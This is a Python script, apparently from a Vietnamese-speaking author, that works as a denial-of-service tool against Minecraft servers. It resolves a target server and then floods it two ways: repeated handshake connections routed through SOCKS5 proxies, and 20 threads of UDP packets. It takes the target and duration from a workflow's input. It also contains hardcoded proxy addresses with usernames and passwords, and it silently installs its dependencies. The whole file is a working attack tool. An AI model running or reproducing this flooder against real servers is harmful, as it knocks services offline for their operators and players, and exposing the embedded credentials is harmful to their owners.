
import os, sys, socket, random, asyncio, socks, threading, time, requests, subprocess, importlib
from colorama import init, Fore, Style

def check_install(module):
    try: importlib.import_module(module)
    except ImportError: subprocess.check_call([sys.executable, "-m", "pip", "install", module])

for m in ["requests", "colorama", "PySocks"]: check_install(m)
init()

# --- DATA PROXIES (Premium List) ---
PREMIUM_PROXIES = ["23.95.45.128:21361:muaproxy698ebae77a65e:50urayquqnugq4ne", "58.187.172.173:13109:muaproxy698ebad52dbca:lizyfewekbvxe2rc"] # ... (Giữ nguyên list cũ)

def parse_target(raw_input):
    raw_input = raw_input.replace("http://", "").replace("https://", "").strip()
    try:
        if ":" in raw_input:
            parts = raw_input.split(":")
            return socket.gethostbyname(parts[0]), int(parts[1])
        res = requests.get(f"https://api.mcsrvstat.us/2/{raw_input}", timeout=5).json()
        if res.get("ip"): return res["ip"], res.get("port", 25565)
        return socket.gethostbyname(raw_input), 25565
    except: return None, None

async def bot_join_task(proxy, ip, port, stop_event):
    p = proxy.split(':')
    handshake = b'\x0f\x00\x2f\x09localhost\x63\xdd\x02'
    while not stop_event.is_set():
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, p[0], int(p[1]), True, p[2], p[3])
            s.settimeout(3)
            s.connect((ip, port))
            s.send(handshake)
            await asyncio.sleep(15)
            s.close()
        except: await asyncio.sleep(1)

def udp_flood(ip, port, stop_event):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"\x1b" + 47 * b"\0"
    while not stop_event.is_set():
        try: client.sendto(payload, (ip, port))
        except: pass

async def auto_run():
    # NHẬN INPUT TỪ WORKFLOW (CƠ CHẾ GIỐNG GUI)
    raw_target = sys.stdin.readline().strip()
    duration = int(sys.stdin.readline().strip())
    
    target_ip, target_port = parse_target(raw_target)
    if not target_ip: return

    stop_event_async = asyncio.Event()
    stop_event_thread = threading.Event()
    
    tasks = []
    for p in PREMIUM_PROXIES:
        for _ in range(3):
            tasks.append(asyncio.create_task(bot_join_task(p, target_ip, target_port, stop_event_async)))
    for _ in range(20):
        threading.Thread(target=udp_flood, args=(target_ip, target_port, stop_event_thread), daemon=True).start()

    await asyncio.sleep(duration)
    stop_event_async.set()
    stop_event_thread.set()

if __name__ == "__main__":
    asyncio.run(auto_run())
